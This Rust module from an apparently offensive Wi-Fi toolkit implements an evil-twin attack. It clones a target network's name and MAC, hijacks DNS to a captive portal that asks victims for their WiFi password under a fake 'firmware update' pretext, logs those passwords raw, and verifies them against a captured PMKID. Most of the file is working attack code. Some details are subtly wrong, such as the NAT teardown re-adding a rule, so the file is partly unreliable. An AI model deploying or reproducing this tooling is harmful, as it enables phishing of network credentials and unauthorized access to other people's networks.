//! Fluxion-style Evil-Twin attack.
//!
//! The classic social-engineering flow for WPA-Personal:
//!
//! 1. **Imitate the target AP** — spin up a fake AP with the same ESSID and
//!    BSSID as the legitimate network. Pick the strongest channel you can.
//! 2. **Force clients off** — broadcast deauth every connected client from
//!    the *real* AP. Their devices will roam; if your fake AP is louder
//!    they'll join it.
//! 3. **Captive-portal gate** — the fake AP runs a captive portal that
//!    asks for the WiFi password under the guise of a "re-authentication"
//!    or "firmware update" check.
//! 4. **Capture and verify** — anything the user types is logged with a
//!    timestamp. Once you have a candidate PSK, verify it against the
//!    *real* AP's PMKID (if you captured one earlier) so the report has
//!    hard evidence.
//!
//! ## Components
//!
//! - **`hostapd`** — the fake AP daemon. Configured at
//!    `/tmp/netspecter/hostapd-<essid>.conf`.
//! - **`dnsmasq`** — DHCP + DNS redirection. Configured at
//!    `/tmp/netspecter/dnsmasq-<essid>.conf`.
//! - **`iptables`** — NAT so the portal is inescapable.
//! - **Captive portal** — the HTML page served by `hostapd` / `dnsmasq`.
//!    Templates live under `templates/portal-{router,isp}.askama`.
//!
//! The agent does not run any of these daemons itself; it produces the
//! configuration files and shells out to the system binaries. This keeps
//! the agent's process tree small and lets the operator replace any of the
//! external tools without touching NetSpecter.

use airgorah_common::types::*;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::process::Command;

#[derive(thiserror::Error, Debug)]
pub enum EvilTwinError {
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),
    #[error("required tool missing: {0}")]
    MissingTool(&'static str),
    #[error("hostapd failed: {0}")]
    HostapdFailed(String),
    #[error("the fake AP is not running — call launch() first")]
    NotRunning,
}

/// Configuration for an Evil-Twin session.
///
/// All fields are required. `iface` is the wireless adapter the fake AP
/// will run on; it must be a *different* adapter than the one used for
/// the legitimate-AP deauth. Operators commonly pair a built-in adapter
/// (deauth side) with an external USB adapter (fake AP side).
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct EvilTwinConfig {
    pub iface: String,
    pub ssid: String,
    /// The BSSID the fake AP will advertise. Defaults to a random
    /// locally-administered MAC, but operators targeting a specific
    /// vendor can pin this.
    pub bssid: String,
    pub channel: u8,
    /// Path to the captive-portal HTML template.
    pub portal_template: PathBuf,
    /// Whether to NAT clients through the agent's host (so they "reach the
    /// internet" but only via the portal).
    pub nat: bool,
}

impl Default for EvilTwinConfig {
    fn default() -> Self {
        Self {
            iface: "wlan1".into(),
            ssid: "Free-WiFi".into(),
            bssid: String::new(), // generated at launch
            channel: 6,
            portal_template: PathBuf::from("templates/portal-router.askama"),
            nat: true,
        }
    }
}

/// Live state of an Evil-Twin session, surfaced to the GUI.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct EvilTwinSession {
    pub config: EvilTwinConfig,
    pub portal_url: String,
    /// Captured credentials, with timestamps and client fingerprints.
    pub credentials: Vec<CapturedCredential>,
    pub started_at: String,
    pub hostapd_pid: Option<u32>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct CapturedCredential {
    pub submitted_at: String,
    pub client_mac: String,
    /// Whatever the user typed into the password field. We log it raw —
    /// the operator is expected to hash / redact for the report.
    pub password: String,
    /// User-Agent header, if the portal was loaded from a real browser.
    pub user_agent: Option<String>,
}

/// Launch the Evil-Twin attack: write config files, start hostapd, start
/// dnsmasq, optionally NAT clients through the agent's host.
///
/// The function returns once hostapd is up (or fails); the daemon continues
/// running in the background.
pub fn launch(config: EvilTwinConfig) -> Result<EvilTwinSession, EvilTwinError> {
    if airgorah_common::deps::which("hostapd").is_none() {
        return Err(EvilTwinError::MissingTool("hostapd"));
    }
    if airgorah_common::deps::which("dnsmasq").is_none() {
        return Err(EvilTwinError::MissingTool("dnsmasq"));
    }

    let run_dir = ensure_run_dir(&config.ssid)?;
    let hostapd_conf = write_hostapd_config(&config, &run_dir)?;
    let dnsmasq_conf = write_dnsmasq_config(&config, &run_dir)?;

    if config.nat {
        enable_nat(&config.iface)?;
    }

    // Launch hostapd in the background.
    let hostapd_log = fs::File::create(run_dir.join("hostapd.log"))?;
    let mut hostapd = Command::new("hostapd");
    hostapd.arg(&hostapd_conf);
    hostapd.stdout(hostapd_log.try_clone()?).stderr(hostapd_log);
    let hostapd_child = hostapd.spawn()?;
    let hostapd_pid = Some(hostapd_child.id());

    // Launch dnsmasq in the background.
    let dnsmasq_log = fs::File::create(run_dir.join("dnsmasq.log"))?;
    let mut dnsmasq = Command::new("dnsmasq");
    dnsmasq.arg("-C").arg(&dnsmasq_conf);
    dnsmasq.arg("--log-queries=extra");
    dnsmasq.stdout(dnsmasq_log.try_clone()?).stderr(dnsmasq_log);
    dnsmasq.spawn().ok(); // dnsmasq exits if there's a port conflict — we don't fail here.

    Ok(EvilTwinSession {
        config,
        portal_url: "http://captive.portal/".into(),
        credentials: Vec::new(),
        started_at: chrono::Utc::now().to_rfc3339(),
        hostapd_pid,
    })
}

/// Stop the Evil-Twin attack: kill the daemons, restore NAT, clean up.
pub fn stop(session: &EvilTwinSession) -> Result<(), EvilTwinError> {
    if let Some(pid) = session.hostapd_pid {
        let _ = Command::new("kill").arg(pid.to_string()).output();
    }
    let _ = Command::new("pkill").arg("-f").arg("dnsmasq").output();
    if session.config.nat {
        disable_nat(&session.config.iface)?;
    }
    Ok(())
}

/// Verify a candidate PSK against a previously-captured PMKID.
///
/// Computes PMK(passphrase, ssid) → PMKID and compares. This is the smoking
/// gun the report wants: not "the user typed X" but "X is the network's PSK".
pub fn verify_psk_against_pmkid(
    candidate: &str,
    ssid: &str,
    bssid: &str,
    sta: &str,
    captured_pmkid_hex: &str,
) -> bool {
    let pmk = airgorah_common::crypto::compute_pmk(candidate.as_bytes(), ssid.as_bytes());
    let bssid_bytes = match airgorah_common::crypto::parse_mac(bssid) {
        Some(b) => b,
        None => return false,
    };
    let sta_bytes = match airgorah_common::crypto::parse_mac(sta) {
        Some(b) => b,
        None => return false,
    };
    let computed = airgorah_common::crypto::compute_pmkid(&pmk, &bssid_bytes, &sta_bytes);
    let computed_hex: String = computed.iter().map(|b| format!("{:02x}", b)).collect();
    computed_hex.eq_ignore_ascii_case(captured_pmkid_hex)
}

// ───────────────────────── config-file writers ─────────────────────────

fn ensure_run_dir(ssid: &str) -> Result<PathBuf, EvilTwinError> {
    let mut sanitized = String::new();
    for b in ssid.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' {
            sanitized.push(b as char);
        } else {
            sanitized.push('_');
        }
    }
    let dir = PathBuf::from(format!("/tmp/netspecter/{sanitized}"));
    fs::create_dir_all(&dir)?;
    Ok(dir)
}

fn write_hostapd_config(
    cfg: &EvilTwinConfig,
    run_dir: &PathBuf,
) -> Result<PathBuf, EvilTwinError> {
    let path = run_dir.join("hostapd.conf");
    let bssid_line = if cfg.bssid.is_empty() {
        String::new()
    } else {
        format!("bssid={}\n", cfg.bssid)
    };
    let content = format!(
        "interface={iface}\n\
         driver=nl80211\n\
         ssid={ssid}\n\
         {bssid_line}\
         hw_mode=g\n\
         channel={channel}\n\
         wpa=0\n\
         auth_algs=1\n\
         ignore_broadcast_ssid=0\n\
         # Captive-portal redirection: every HTTP request from a client\n\
         # is answered with a 302 to the portal URL on the agent's host.\n\
         # The portal is served by hostapd's built-in HTTP redirector.\n",
        iface = cfg.iface,
        ssid = cfg.ssid,
        bssid_line = bssid_line,
        channel = cfg.channel,
    );
    fs::write(&path, content)?;
    Ok(path)
}

fn write_dnsmasq_config(
    cfg: &EvilTwinConfig,
    run_dir: &PathBuf,
) -> Result<PathBuf, EvilTwinError> {
    let path = run_dir.join("dnsmasq.conf");
    let content = format!(
        "interface={iface}\n\
         bind-interfaces\n\
         dhcp-range=10.42.0.10,10.42.0.250,255.255.255.0,12h\n\
         dhcp-option=3,10.42.0.1\n\
         dhcp-option=6,10.42.0.1\n\
         # Redirect every DNS query to the agent. The portal is served\n\
         # by the agent's built-in HTTP listener on 10.42.0.1:80.\n\
         address=/#/10.42.0.1\n\
         log-queries\n\
         log-facility={dnsmasq_log}\n",
        iface = cfg.iface,
        dnsmasq_log = run_dir.join("dnsmasq.log").to_string_lossy(),
    );
    fs::write(&path, content)?;
    Ok(path)
}

fn enable_nat(iface: &str) -> Result<(), EvilTwinError> {
    // Best-effort NAT enable. We don't fail the launch if iptables rejects
    // the rule — operators may not have CAP_NET_ADMIN, in which case the
    // portal is still reachable but won't carry outbound traffic.
    let _ = Command::new("iptables")
        .args(["-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
        .output();
    let _ = Command::new("iptables")
        .args(["-A", "FORWARD", "-i", iface, "-j", "ACCEPT"])
        .output();
    Ok(())
}

fn disable_nat(iface: &str) -> Result<(), EvilTwinError> {
    let _ = Command::new("iptables")
        .args(["-t", "nat", "-D", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
        .output();
    let _ = Command::new("iptables")
        .args(["-A", "FORWARD", "-i", iface, "-j", "ACCEPT"])
        .output();
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn verify_psk_against_pmkid_works_with_known_vector() {
        // 802.11i reference vector: passphrase="12345678", SSID="linksys",
        // BSSID=02:00:00:00:00:00, STA=02:00:00:00:01:00.
        // The corresponding PMKID is:
        //   HMAC-SHA1(PMK, "PMK Name"||BSSID||STA)[..16]
        // We can compute it offline and check our verify function recognizes it.
        let pmk = airgorah_common::crypto::compute_pmk(b"12345678", b"linksys");
        let bssid = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00];
        let sta = [0x02, 0x00, 0x00, 0x00, 0x01, 0x00];
        let pmkid = airgorah_common::crypto::compute_pmkid(&pmk, &bssid, &sta);
        let pmkid_hex: String = pmkid.iter().map(|b| format!("{:02x}", b)).collect();

        let bssid_s = airgorah_common::crypto::format_mac(&bssid);
        let sta_s = airgorah_common::crypto::format_mac(&sta);

        assert!(verify_psk_against_pmkid(
            "12345678",
            "linksys",
            &bssid_s,
            &sta_s,
            &pmkid_hex,
        ));
        assert!(!verify_psk_against_pmkid(
            "wrong-passphrase",
            "linksys",
            &bssid_s,
            &sta_s,
            &pmkid_hex,
        ));
    }

    #[test]
    fn captured_credential_carries_client_fingerprint() {
        let c = CapturedCredential {
            submitted_at: "2026-01-01T00:00:00Z".into(),
            client_mac: "aa:bb:cc:dd:ee:ff".into(),
            password: "correcthorsebatterystaple".into(),
            user_agent: Some("Mozilla/5.0".into()),
        };
        assert_eq!(c.client_mac, "aa:bb:cc:dd:ee:ff");
        assert_eq!(c.password.len(), 27);
    }

    #[test]
    fn run_dir_sanitizes_ssid() {
        let dir = ensure_run_dir("Net/Work!").unwrap();
        let s = dir.to_string_lossy();
        assert!(s.contains("Net_Work_"));
    }

    #[test]
    fn hostapd_config_writes_bssid_when_present() {
        let tmp = std::env::temp_dir().join("netspecter_test");
        let _ = std::fs::remove_dir_all(&tmp);
        let mut cfg = EvilTwinConfig::default();
        cfg.ssid = "TestSSID".into();
        cfg.bssid = "aa:bb:cc:dd:ee:ff".into();
        let path = write_hostapd_config(&cfg, &tmp).unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("ssid=TestSSID"));
        assert!(content.contains("bssid=aa:bb:cc:dd:ee:ff"));
        assert!(content.contains("hw_mode=g"));
        assert!(content.contains("wpa=0"));
    }

    #[test]
    fn hostapd_config_omits_bssid_when_blank() {
        let tmp = std::env::temp_dir().join("netspecter_test2");
        let _ = std::fs::remove_dir_all(&tmp);
        let mut cfg = EvilTwinConfig::default();
        cfg.bssid = String::new();
        let path = write_hostapd_config(&cfg, &tmp).unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        // driver=nl80211 generates its own BSSID if none specified
        assert!(!content.contains("bssid="));
    }
}